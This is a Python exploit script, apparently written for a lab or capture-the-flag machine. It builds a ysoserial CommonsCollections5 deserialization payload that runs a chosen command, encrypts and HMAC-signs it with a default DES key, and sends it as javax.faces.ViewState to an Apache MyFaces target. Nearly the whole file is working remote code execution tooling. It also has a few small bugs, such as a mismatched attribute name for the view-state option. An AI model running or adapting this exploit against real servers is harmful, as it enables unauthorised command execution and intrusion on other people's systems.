#!/usr/bin/env python3
from base64 import b64decode, b64encode
from hashlib import sha1
import hmac
import subprocess
import requests
import pyDes



# Create payload bin using ysoserial.jar
def create_payload(cmd, output_path="payloads/cc5.bin"):

    # Path to ysoserial.jar
    yss_jar = "ysoserial.jar"

    # Ysoserious payload
    yss_payload = "CommonsCollections5"

    command = f"java -jar {yss_jar} {yss_payload} '{cmd}' > {output_path}"
    print(f"Running subprocess:\t {command}")
    subprocess.run(command, shell=True)


# Decrypt javax.faces.ViewState w/ (base64 encoded) key
def decrypt_view_state(view_state, b64_key):

    # Decode base65'd view_state and key
    key = b64decode(b64_key)
    view_state = b64decode(view_state)

    # troubleshooting:
    print("key length: ", len(key))
    print("view length: ", len(view_state))

    # Pad view_state if not multiple of 8
    mod = len(view_state) % 8
    if mod != 0:
        print("Padding view_state...")
        padding = b"\x00" * (8 - mod)
        view_state += padding

    obj = pyDes.des(key, pyDes.ECB, padmode=pyDes.PAD_PKCS5)
    return obj.decrypt(view_state)


# Encrypt payload with key, then base64 that and return it
def encrypt_payload(payload, b64_key):

    # Prep key to encrypt payload
    key = b64decode(b64_key)
    obj = pyDes.des(key, pyDes.ECB, padmode=pyDes.PAD_PKCS5)

    # Encrypt payload
    encrypted = obj.encrypt(payload)
    hash_val = (hmac.new(key, bytes(encrypted), sha1).digest())
    enc_payload = encrypted + hash_val

    # base64 encode the encrypted payload
    return b64encode(enc_payload)


# Send payload to target
def exploit(payload, target):

    data = { "javax.faces.ViewState" : payload }

    print(f"Sending malicious payload to {target}")
    requests.post(target, data=data)


# Read payload and return payload bytes, given path to payload
def read_payload(payload):
    payload = open(payload, 'rb').read()
    return payload


def main():

    # Decrypt a javax.faces.ViewState
    if args.viewState:
        decrypted_state = decrypt_view_state(args.view_state, args.key)
        print("\nView state decrypted:")
        print(decrypted_state, "\n\n")

    # Payload creation
    if args.payload or args.cmd:

        # Create payload to execute an argument
        if args.cmd:
            create_payload(args.cmd, output_path=args.payload)

        # Print encrypted payload
        if args.payload:
            payload = read_payload(args.payload)
            encrypted_payload = encrypt_payload(payload, args.key)

        # Run exploit
        exploit(encrypted_payload, args.target)


if __name__ == '__main__':
    import argparse

    parser = argparse.ArgumentParser(description="Create and send payload to site running Apache MyFaces")
    parser.add_argument("-c", "--cmd",
            help="Compile payload to run given command")
    parser.add_argument("-k", "--key",
            default="SnNGOTg3Ni0=",
            help="Base64 encoded key for javax decryption")
    parser.add_argument("-p", "--payload",
            default="payload.bin",
            help="Path to payload binary")
    parser.add_argument("-t", "--target",
            default="http://10.10.10.130:8080/userSubscribe.faces",
            help="URL payload will be sent to")
    parser.add_argument("--viewState",
            help="Decrypt javax.faces.ViewState. Useful for testing key validity")

    args = parser.parse_args()

    main()
